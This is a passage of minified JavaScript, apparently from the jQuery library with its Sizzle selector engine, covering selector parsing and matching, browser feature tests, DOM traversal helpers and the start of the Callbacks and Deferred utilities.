n;return-1},R="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",M="[\\x20\\t\\r\\n\\f]",I="(?:\\\\[\\da-fA-F]{1,6}"+M+"?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",W="\\["+M+"*("+I+")(?:"+M+"*([*^$|!~]?=)"+M+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+I+"))|)"+M+"*\\]",F=":("+I+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+W+")*)|.*)\\)|)",$=new RegExp(M+"+","g"),B=new RegExp("^"+M+"+|((?:^|[^\\\\])(?:\\\\.)*)"+M+"+$","g"),_=new RegExp("^"+M+"*,"+M+"*"),z=new RegExp("^"+M+"*([>+~]|"+M+")"+M+"*"),U=new RegExp(M+"|>"),X=new RegExp(F),V=new RegExp("^"+I+"$"),G={ID:new RegExp("^#("+I+")"),CLASS:new RegExp("^\\.("+I+")"),TAG:new RegExp("^("+I+"|[*])"),ATTR:new RegExp("^"+W),PSEUDO:new RegExp("^"+F),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+M+"*(even|odd|(([+-]|)(\\d*)n|)"+M+"*(?:([+-]|)"+M+"*(\\d+)|))"+M+"*\\)|)","i"),bool:new RegExp("^(?:"+R+")$","i"),needsContext:new RegExp("^"+M+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+M+"*((?:-\\d)?\\d*)"+M+"*\\)|)(?=[^-]|$)","i")},Y=/HTML$/i,Q=/^(?:input|select|textarea|button)$/i,J=/^h\d$/i,K=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ee=/[+~]/,te=new RegExp("\\\\[\\da-fA-F]{1,6}"+M+"?|\\\\([^\\r\\n\\f])","g"),ne=function(e,t){var n="0x"+e.slice(1)-65536;return t||(n<0?String.fromCharCode(n+65536):String.fromCharCode(n>>10|55296,1023&n|56320))},re=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,ie=function(e,t){return t?"\0"===e?"\ufffd":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},oe=function(){T()},ae=be(function(e){return!0===e.disabled&&"fieldset"===e.nodeName.toLowerCase()},{dir:"parentNode",next:"legend"});try{H.apply(t=O.call(p.childNodes),p.childNodes),t[p.childNodes.length].nodeType}catch(e){H={apply:t.length?function(e,t){L.apply(e,O.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function se(t,e,n,r){var i,o,a,s,u,l,c,f=e&&e.ownerDocument,p=e?e.nodeType:9;if(n=n||[],"string"!=typeof t||!t||1!==p&&9!==p&&11!==p)return n;if(!r&&(T(e),e=e||C,E)){if(11!==p&&(u=Z.exec(t)))if(i=u[1]){if(9===p){if(!(a=e.getElementById(i)))return n;if(a.id===i)return n.push(a),n}else if(f&&(a=f.getElementById(i))&&v(e,a)&&a.id===i)return n.push(a),n}else{if(u[2])return H.apply(n,e.getElementsByTagName(t)),n;if((i=u[3])&&d.getElementsByClassName&&e.getElementsByClassName)return H.apply(n,e.getElementsByClassName(i)),n}if(d.qsa&&!N[t+" "]&&(!y||!y.test(t))&&(1!==p||"object"!==e.nodeName.toLowerCase())){if(c=t,f=e,1===p&&(U.test(t)||z.test(t))){(f=ee.test(t)&&ve(e.parentNode)||e)===e&&d.scope||((s=e.getAttribute("id"))?s=s.replace(re,ie):e.setAttribute("id",s=S)),o=(l=h(t)).length;while(o--)l[o]=(s?"#"+s:":scope")+" "+xe(l[o]);c=l.join(",")}try{return H.apply(n,f.querySelectorAll(c)),n}catch(e){N(t,!0)}finally{s===S&&e.removeAttribute("id")}}}return g(t.replace(B,"$1"),e,n,r)}function ue(){var r=[];return function e(t,n){return r.push(t+" ")>b.cacheLength&&delete e[r.shift()],e[t+" "]=n}}function le(e){return e[S]=!0,e}function ce(e){var t=C.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function fe(e,t){var n=e.split("|"),r=n.length;while(r--)b.attrHandle[n[r]]=t}function pe(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function de(t){return function(e){return"input"===e.nodeName.toLowerCase()&&e.type===t}}function he(n){return function(e){var t=e.nodeName.toLowerCase();return("input"===t||"button"===t)&&e.type===n}}function ge(t){return function(e){return"form"in e?e.parentNode&&!1===e.disabled?"label"in e?"label"in e.parentNode?e.parentNode.disabled===t:e.disabled===t:e.isDisabled===t||e.isDisabled!==!t&&ae(e)===t:e.disabled===t:"label"in e&&e.disabled===t}}function ye(a){return le(function(o){return o=+o,le(function(e,t){var n,r=a([],e.length,o),i=r.length;while(i--)e[n=r[i]]&&(e[n]=!(t[n]=e[n]))})})}function ve(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}for(e in d=se.support={},i=se.isXML=function(e){var t=e&&e.namespaceURI,n=e&&(e.ownerDocument||e).documentElement;return!Y.test(t||n&&n.nodeName||"HTML")},T=se.setDocument=function(e){var t,n,r=e?e.ownerDocument||e:p;return r!=C&&9===r.nodeType&&r.documentElement&&(a=(C=r).documentElement,E=!i(C),p!=C&&(n=C.defaultView)&&n.top!==n&&(n.addEventListener?n.addEventListener("unload",oe,!1):n.attachEvent&&n.attachEvent("onunload",oe)),d.scope=ce(function(e){return a.appendChild(e).appendChild(C.createElement("div")),"undefined"!=typeof e.querySelectorAll&&!e.querySelectorAll(":scope fieldset div").length}),d.attributes=ce(function(e){return e.className="i",!e.getAttribute("className")}),d.getElementsByTagName=ce(function(e){return e.appendChild(C.createComment("")),!e.getElementsByTagName("*").length}),d.getElementsByClassName=K.test(C.getElementsByClassName),d.getById=ce(function(e){return a.appendChild(e).id=S,!C.getElementsByName||!C.getElementsByName(S).length}),d.getById?(b.filter.ID=function(e){var t=e.replace(te,ne);return function(e){return e.getAttribute("id")===t}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n=t.getElementById(e);return n?[n]:[]}}):(b.filter.ID=function(e){var n=e.replace(te,ne);return function(e){var t="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return t&&t.value===n}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n,r,i,o=t.getElementById(e);if(o){if((n=o.getAttributeNode("id"))&&n.value===e)return[o];i=t.getElementsByName(e),r=0;while(o=i[r++])if((n=o.getAttributeNode("id"))&&n.value===e)return[o]}return[]}}),b.find.TAG=d.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):d.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},b.find.CLASS=d.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&E)return t.getElementsByClassName(e)},s=[],y=[],(d.qsa=K.test(C.querySelectorAll))&&(ce(function(e){var t;a.appendChild(e).innerHTML="<a id='"+S+"'></a><select id='"+S+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&y.push("[*^$]="+M+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||y.push("\\["+M+"*(?:value|"+R+")"),e.querySelectorAll("[id~="+S+"-]").length||y.push("~="),(t=C.createElement("input")).setAttribute("name",""),e.appendChild(t),e.querySelectorAll("[name='']").length||y.push("\\["+M+"*name"+M+"*="+M+"*(?:''|\"\")"),e.querySelectorAll(":checked").length||y.push(":checked"),e.querySelectorAll("a#"+S+"+*").length||y.push(".#.+[+~]"),e.querySelectorAll("\\\f"),y.push("[\\r\\n\\f]")}),ce(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=C.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&y.push("name"+M+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&y.push(":enabled",":disabled"),a.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&y.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),y.push(",.*:")})),(d.matchesSelector=K.test(c=a.matches||a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.msMatchesSelector))&&ce(function(e){d.disconnectedMatch=c.call(e,"*"),c.call(e,"[s!='']:x"),s.push("!=",F)}),y=y.length&&new RegExp(y.join("|")),s=s.length&&new RegExp(s.join("|")),t=K.test(a.compareDocumentPosition),v=t||K.test(a.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},j=t?function(e,t){if(e===t)return l=!0,0;var n=!e.compareDocumentPosition-!t.compareDocumentPosition;return n||(1&(n=(e.ownerDocument||e)==(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!d.sortDetached&&t.compareDocumentPosition(e)===n?e==C||e.ownerDocument==p&&v(p,e)?-1:t==C||t.ownerDocument==p&&v(p,t)?1:u?P(u,e)-P(u,t):0:4&n?-1:1)}:function(e,t){if(e===t)return l=!0,0;var n,r=0,i=e.parentNode,o=t.parentNode,a=[e],s=[t];if(!i||!o)return e==C?-1:t==C?1:i?-1:o?1:u?P(u,e)-P(u,t):0;if(i===o)return pe(e,t);n=e;while(n=n.parentNode)a.unshift(n);n=t;while(n=n.parentNode)s.unshift(n);while(a[r]===s[r])r++;return r?pe(a[r],s[r]):a[r]==p?-1:s[r]==p?1:0}),C},se.matches=function(e,t){return se(e,null,null,t)},se.matchesSelector=function(e,t){if(T(e),d.matchesSelector&&E&&!N[t+" "]&&(!s||!s.test(t))&&(!y||!y.test(t)))try{var n=c.call(e,t);if(n||d.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(e){N(t,!0)}return 0<se(t,C,null,[e]).length},se.contains=function(e,t){return(e.ownerDocument||e)!=C&&T(e),v(e,t)},se.attr=function(e,t){(e.ownerDocument||e)!=C&&T(e);var n=b.attrHandle[t.toLowerCase()],r=n&&D.call(b.attrHandle,t.toLowerCase())?n(e,t,!E):void 0;return void 0!==r?r:d.attributes||!E?e.getAttribute(t):(r=e.getAttributeNode(t))&&r.specified?r.value:null},se.escape=function(e){return(e+"").replace(re,ie)},se.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},se.uniqueSort=function(e){var t,n=[],r=0,i=0;if(l=!d.detectDuplicates,u=!d.sortStable&&e.slice(0),e.sort(j),l){while(t=e[i++])t===e[i]&&(r=n.push(i));while(r--)e.splice(n[r],1)}return u=null,e},o=se.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=o(e)}else if(3===i||4===i)return e.nodeValue}else while(t=e[r++])n+=o(t);return n},(b=se.selectors={cacheLength:50,createPseudo:le,match:G,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(te,ne),e[3]=(e[3]||e[4]||e[5]||"").replace(te,ne),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||se.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&se.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return G.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&X.test(n)&&(t=h(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(te,ne).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=m[e+" "];return t||(t=new RegExp("(^|"+M+")"+e+"("+M+"|$)"))&&m(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(n,r,i){return function(e){var t=se.attr(e,n);return null==t?"!="===r:!r||(t+="","="===r?t===i:"!="===r?t!==i:"^="===r?i&&0===t.indexOf(i):"*="===r?i&&-1<t.indexOf(i):"$="===r?i&&t.slice(-i.length)===i:"~="===r?-1<(" "+t.replace($," ")+" ").indexOf(i):"|="===r&&(t===i||t.slice(0,i.length+1)===i+"-"))}},CHILD:function(h,e,t,g,y){var v="nth"!==h.slice(0,3),m="last"!==h.slice(-4),x="of-type"===e;return 1===g&&0===y?function(e){return!!e.parentNode}:function(e,t,n){var r,i,o,a,s,u,l=v!==m?"nextSibling":"previousSibling",c=e.parentNode,f=x&&e.nodeName.toLowerCase(),p=!n&&!x,d=!1;if(c){if(v){while(l){a=e;while(a=a[l])if(x?a.nodeName.toLowerCase()===f:1===a.nodeType)return!1;u=l="only"===h&&!u&&"nextSibling"}return!0}if(u=[m?c.firstChild:c.lastChild],m&&p){d=(s=(r=(i=(o=(a=c)[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===k&&r[1])&&r[2],a=s&&c.childNodes[s];while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if(1===a.nodeType&&++d&&a===e){i[h]=[k,s,d];break}}else if(p&&(d=s=(r=(i=(o=(a=e)[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===k&&r[1]),!1===d)while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if((x?a.nodeName.toLowerCase()===f:1===a.nodeType)&&++d&&(p&&((i=(o=a[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]=[k,d]),a===e))break;return(d-=y)===g||d%g==0&&0<=d/g}}},PSEUDO:function(e,o){var t,a=b.pseudos[e]||b.setFilters[e.toLowerCase()]||se.error("unsupported pseudo: "+e);return a[S]?a(o):1<a.length?(t=[e,e,"",o],b.setFilters.hasOwnProperty(e.toLowerCase())?le(function(e,t){var n,r=a(e,o),i=r.length;while(i--)e[n=P(e,r[i])]=!(t[n]=r[i])}):function(e){return a(e,0,t)}):a}},pseudos:{not:le(function(e){var r=[],i=[],s=f(e.replace(B,"$1"));return s[S]?le(function(e,t,n,r){var i,o=s(e,null,r,[]),a=e.length;while(a--)(i=o[a])&&(e[a]=!(t[a]=i))}):function(e,t,n){return r[0]=e,s(r,null,n,i),r[0]=null,!i.pop()}}),has:le(function(t){return function(e){return 0<se(t,e).length}}),contains:le(function(t){return t=t.replace(te,ne),function(e){return-1<(e.textContent||o(e)).indexOf(t)}}),lang:le(function(n){return V.test(n||"")||se.error("unsupported lang: "+n),n=n.replace(te,ne).toLowerCase(),function(e){var t;do{if(t=E?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(t=t.toLowerCase())===n||0===t.indexOf(n+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}}),target:function(e){var t=n.location&&n.location.hash;return t&&t.slice(1)===e.id},root:function(e){return e===a},focus:function(e){return e===C.activeElement&&(!C.hasFocus||C.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:ge(!1),disabled:ge(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!b.pseudos.empty(e)},header:function(e){return J.test(e.nodeName)},input:function(e){return Q.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:ye(function(){return[0]}),last:ye(function(e,t){return[t-1]}),eq:ye(function(e,t,n){return[n<0?n+t:n]}),even:ye(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:ye(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:ye(function(e,t,n){for(var r=n<0?n+t:t<n?t:n;0<=--r;)e.push(r);return e}),gt:ye(function(e,t,n){for(var r=n<0?n+t:n;++r<t;)e.push(r);return e})}}).pseudos.nth=b.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})b.pseudos[e]=de(e);for(e in{submit:!0,reset:!0})b.pseudos[e]=he(e);function me(){}function xe(e){for(var t=0,n=e.length,r="";t<n;t++)r+=e[t].value;return r}function be(s,e,t){var u=e.dir,l=e.next,c=l||u,f=t&&"parentNode"===c,p=r++;return e.first?function(e,t,n){while(e=e[u])if(1===e.nodeType||f)return s(e,t,n);return!1}:function(e,t,n){var r,i,o,a=[k,p];if(n){while(e=e[u])if((1===e.nodeType||f)&&s(e,t,n))return!0}else while(e=e[u])if(1===e.nodeType||f)if(i=(o=e[S]||(e[S]={}))[e.uniqueID]||(o[e.uniqueID]={}),l&&l===e.nodeName.toLowerCase())e=e[u]||e;else{if((r=i[c])&&r[0]===k&&r[1]===p)return a[2]=r[2];if((i[c]=a)[2]=s(e,t,n))return!0}return!1}}function we(i){return 1<i.length?function(e,t,n){var r=i.length;while(r--)if(!i[r](e,t,n))return!1;return!0}:i[0]}function Te(e,t,n,r,i){for(var o,a=[],s=0,u=e.length,l=null!=t;s<u;s++)(o=e[s])&&(n&&!n(o,r,i)||(a.push(o),l&&t.push(s)));return a}function Ce(d,h,g,y,v,e){return y&&!y[S]&&(y=Ce(y)),v&&!v[S]&&(v=Ce(v,e)),le(function(e,t,n,r){var i,o,a,s=[],u=[],l=t.length,c=e||function(e,t,n){for(var r=0,i=t.length;r<i;r++)se(e,t[r],n);return n}(h||"*",n.nodeType?[n]:n,[]),f=!d||!e&&h?c:Te(c,s,d,n,r),p=g?v||(e?d:l||y)?[]:t:f;if(g&&g(f,p,n,r),y){i=Te(p,u),y(i,[],n,r),o=i.length;while(o--)(a=i[o])&&(p[u[o]]=!(f[u[o]]=a))}if(e){if(v||d){if(v){i=[],o=p.length;while(o--)(a=p[o])&&i.push(f[o]=a);v(null,p=[],i,r)}o=p.length;while(o--)(a=p[o])&&-1<(i=v?P(e,a):s[o])&&(e[i]=!(t[i]=a))}}else p=Te(p===t?p.splice(l,p.length):p),v?v(null,t,p,r):H.apply(t,p)})}function Ee(e){for(var i,t,n,r=e.length,o=b.relative[e[0].type],a=o||b.relative[" "],s=o?1:0,u=be(function(e){return e===i},a,!0),l=be(function(e){return-1<P(i,e)},a,!0),c=[function(e,t,n){var r=!o&&(n||t!==w)||((i=t).nodeType?u(e,t,n):l(e,t,n));return i=null,r}];s<r;s++)if(t=b.relative[e[s].type])c=[be(we(c),t)];else{if((t=b.filter[e[s].type].apply(null,e[s].matches))[S]){for(n=++s;n<r;n++)if(b.relative[e[n].type])break;return Ce(1<s&&we(c),1<s&&xe(e.slice(0,s-1).concat({value:" "===e[s-2].type?"*":""})).replace(B,"$1"),t,s<n&&Ee(e.slice(s,n)),n<r&&Ee(e=e.slice(n)),n<r&&xe(e))}c.push(t)}return we(c)}return me.prototype=b.filters=b.pseudos,b.setFilters=new me,h=se.tokenize=function(e,t){var n,r,i,o,a,s,u,l=x[e+" "];if(l)return t?0:l.slice(0);a=e,s=[],u=b.preFilter;while(a){for(o in n&&!(r=_.exec(a))||(r&&(a=a.slice(r[0].length)||a),s.push(i=[])),n=!1,(r=z.exec(a))&&(n=r.shift(),i.push({value:n,type:r[0].replace(B," ")}),a=a.slice(n.length)),b.filter)!(r=G[o].exec(a))||u[o]&&!(r=u[o](r))||(n=r.shift(),i.push({value:n,type:o,matches:r}),a=a.slice(n.length));if(!n)break}return t?a.length:a?se.error(e):x(e,s).slice(0)},f=se.compile=function(e,t){var n,y,v,m,x,r,i=[],o=[],a=A[e+" "];if(!a){t||(t=h(e)),n=t.length;while(n--)(a=Ee(t[n]))[S]?i.push(a):o.push(a);(a=A(e,(y=o,m=0<(v=i).length,x=0<y.length,r=function(e,t,n,r,i){var o,a,s,u=0,l="0",c=e&&[],f=[],p=w,d=e||x&&b.find.TAG("*",i),h=k+=null==p?1:Math.random()||.1,g=d.length;for(i&&(w=t==C||t||i);l!==g&&null!=(o=d[l]);l++){if(x&&o){a=0,t||o.ownerDocument==C||(T(o),n=!E);while(s=y[a++])if(s(o,t||C,n)){r.push(o);break}i&&(k=h)}m&&((o=!s&&o)&&u--,e&&c.push(o))}if(u+=l,m&&l!==u){a=0;while(s=v[a++])s(c,f,t,n);if(e){if(0<u)while(l--)c[l]||f[l]||(f[l]=q.call(r));f=Te(f)}H.apply(r,f),i&&!e&&0<f.length&&1<u+v.length&&se.uniqueSort(r)}return i&&(k=h,w=p),c},m?le(r):r))).selector=e}return a},g=se.select=function(e,t,n,r){var i,o,a,s,u,l="function"==typeof e&&e,c=!r&&h(e=l.selector||e);if(n=n||[],1===c.length){if(2<(o=c[0]=c[0].slice(0)).length&&"ID"===(a=o[0]).type&&9===t.nodeType&&E&&b.relative[o[1].type]){if(!(t=(b.find.ID(a.matches[0].replace(te,ne),t)||[])[0]))return n;l&&(t=t.parentNode),e=e.slice(o.shift().value.length)}i=G.needsContext.test(e)?0:o.length;while(i--){if(a=o[i],b.relative[s=a.type])break;if((u=b.find[s])&&(r=u(a.matches[0].replace(te,ne),ee.test(o[0].type)&&ve(t.parentNode)||t))){if(o.splice(i,1),!(e=r.length&&xe(o)))return H.apply(n,r),n;break}}}return(l||f(e,c))(r,t,!E,n,!t||ee.test(e)&&ve(t.parentNode)||t),n},d.sortStable=S.split("").sort(j).join("")===S,d.detectDuplicates=!!l,T(),d.sortDetached=ce(function(e){return 1&e.compareDocumentPosition(C.createElement("fieldset"))}),ce(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||fe("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),d.attributes&&ce(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||fe("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),ce(function(e){return null==e.getAttribute("disabled")})||fe(R,function(e,t,n){var r;if(!n)return!0===e[t]?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),se}(C);S.find=d,S.expr=d.selectors,S.expr[":"]=S.expr.pseudos,S.uniqueSort=S.unique=d.uniqueSort,S.text=d.getText,S.isXMLDoc=d.isXML,S.contains=d.contains,S.escapeSelector=d.escape;var h=function(e,t,n){var r=[],i=void 0!==n;while((e=e[t])&&9!==e.nodeType)if(1===e.nodeType){if(i&&S(e).is(n))break;r.push(e)}return r},T=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},k=S.expr.match.needsContext;function A(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var N=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function j(e,n,r){return m(n)?S.grep(e,function(e,t){return!!n.call(e,t,e)!==r}):n.nodeType?S.grep(e,function(e){return e===n!==r}):"string"!=typeof n?S.grep(e,function(e){return-1<i.call(n,e)!==r}):S.filter(n,e,r)}S.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?S.find.matchesSelector(r,e)?[r]:[]:S.find.matches(e,S.grep(t,function(e){return 1===e.nodeType}))},S.fn.extend({find:function(e){var t,n,r=this.length,i=this;if("string"!=typeof e)return this.pushStack(S(e).filter(function(){for(t=0;t<r;t++)if(S.contains(i[t],this))return!0}));for(n=this.pushStack([]),t=0;t<r;t++)S.find(e,i[t],n);return 1<r?S.uniqueSort(n):n},filter:function(e){return this.pushStack(j(this,e||[],!1))},not:function(e){return this.pushStack(j(this,e||[],!0))},is:function(e){return!!j(this,"string"==typeof e&&k.test(e)?S(e):e||[],!1).length}});var D,q=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(S.fn.init=function(e,t,n){var r,i;if(!e)return this;if(n=n||D,"string"==typeof e){if(!(r="<"===e[0]&&">"===e[e.length-1]&&3<=e.length?[null,e,null]:q.exec(e))||!r[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(r[1]){if(t=t instanceof S?t[0]:t,S.merge(this,S.parseHTML(r[1],t&&t.nodeType?t.ownerDocument||t:E,!0)),N.test(r[1])&&S.isPlainObject(t))for(r in t)m(this[r])?this[r](t[r]):this.attr(r,t[r]);return this}return(i=E.getElementById(r[2]))&&(this[0]=i,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):m(e)?void 0!==n.ready?n.ready(e):e(S):S.makeArray(e,this)}).prototype=S.fn,D=S(E);var L=/^(?:parents|prev(?:Until|All))/,H={children:!0,contents:!0,next:!0,prev:!0};function O(e,t){while((e=e[t])&&1!==e.nodeType);return e}S.fn.extend({has:function(e){var t=S(e,this),n=t.length;return this.filter(function(){for(var e=0;e<n;e++)if(S.contains(this,t[e]))return!0})},closest:function(e,t){var n,r=0,i=this.length,o=[],a="string"!=typeof e&&S(e);if(!k.test(e))for(;r<i;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?-1<a.index(n):1===n.nodeType&&S.find.matchesSelector(n,e))){o.push(n);break}return this.pushStack(1<o.length?S.uniqueSort(o):o)},index:function(e){return e?"string"==typeof e?i.call(S(e),this[0]):i.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(S.uniqueSort(S.merge(this.get(),S(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),S.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return h(e,"parentNode")},parentsUntil:function(e,t,n){return h(e,"parentNode",n)},next:function(e){return O(e,"nextSibling")},prev:function(e){return O(e,"previousSibling")},nextAll:function(e){return h(e,"nextSibling")},prevAll:function(e){return h(e,"previousSibling")},nextUntil:function(e,t,n){return h(e,"nextSibling",n)},prevUntil:function(e,t,n){return h(e,"previousSibling",n)},siblings:function(e){return T((e.parentNode||{}).firstChild,e)},children:function(e){return T(e.firstChild)},contents:function(e){return null!=e.contentDocument&&r(e.contentDocument)?e.contentDocument:(A(e,"template")&&(e=e.content||e),S.merge([],e.childNodes))}},function(r,i){S.fn[r]=function(e,t){var n=S.map(this,i,e);return"Until"!==r.slice(-5)&&(t=e),t&&"string"==typeof t&&(n=S.filter(t,n)),1<this.length&&(H[r]||S.uniqueSort(n),L.test(r)&&n.reverse()),this.pushStack(n)}});var P=/[^\x20\t\r\n\f]+/g;function R(e){return e}function M(e){throw e}function I(e,t,n,r){var i;try{e&&m(i=e.promise)?i.call(e).done(t).fail(n):e&&m(i=e.then)?i.call(e,t,n):t.apply(void 0,[e].slice(r))}catch(e){n.apply(void 0,[e])}}S.Callbacks=function(r){var e,n;r="string"==typeof r?(e=r,n={},S.each(e.match(P)||[],function(e,t){n[t]=!0}),n):S.extend({},r);var i,t,o,a,s=[],u=[],l=-1,c=function(){for(a=a||r.once,o=i=!0;u.length;l=-1){t=u.shift();while(++l<s.length)!1===s[l].apply(t[0],t[1])&&r.stopOnFalse&&(l=s.length,t=!1)}r.memory||(t=!1),i=!1,a&&(s=t?[]:"")},f={add:function(){return s&&(t&&!i&&(l=s.length-1,u.push(t)),function n(e){S.each(e,function(e,t){m(t)?r.unique&&f.has(t)||s.push(t):t&&t.length&&"string"!==w(t)&&n(t)})}(arguments),t&&!i&&c()),this},remove:function(){return S.each(arguments,function(e,t){var n;while(-1<(n=S.inArray(t,s,n)))s.splice(n,1),n<=l&&l--}),this},has:function(e){return e?-1<S.inArray(e,s):0<s.length},empty:function(){return s&&(s=[]),this},disable:function(){return a=u=[],s=t="",this},disabled:function(){return!s},lock:function(){return a=u=[],t||i||(s=t=""),this},locked:function(){return!!a},fireWith:function(e,t){return a||(t=[e,(t=t||[]).slice?t.slice():t],u.push(t),i||c()),this},fire:function(){return f.fireWith(this,arguments),this},fired:function(){return!!o}};return f},S.extend({Deferred:function(e){var o=[["notify","progress",S.Callbacks("memory"),S.Callbacks("memory"),2],["resolve","done",S.Callbacks("once memory"),S.Callbacks("once memory"),0,"resolved"],["reject","fail",S.Callbacks("once memory"),S.Callbacks("once memory"),1,"rejected"]],i="pending",a={state:function(){return i},always:function(){return s.done(arguments).fail(arguments),this},"catch":function(e){return a.then(null,e)},pipe:function(){var i=arguments;return S.Deferred(function(r){S.each(o,function(e,t){var n=m(i[t[4]])&&i[t[4]];s[t[1]](function(){var 